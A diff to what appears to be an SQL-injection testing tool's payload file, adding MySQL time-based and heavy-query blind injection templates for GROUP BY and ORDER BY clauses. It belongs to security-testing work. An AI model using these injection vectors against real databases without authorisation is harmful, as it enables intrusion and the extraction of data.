@@ -2836,6 +2836,49 @@ Formats:
     <!-- End of OR time-based blind tests -->
 
 
+    <!-- Time-based blind tests - GROUP BY and ORDER BY clauses -->
+    <test>
+        <title>MySQL &gt;= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 boolean-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <!-- TODO: add tests for other DBMSes -->
+    <!-- End of time-based blind tests - GROUP BY and ORDER BY clause -->
+
+
     <!-- UNION query tests -->
     <test>
         <title>MySQL UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)</title>
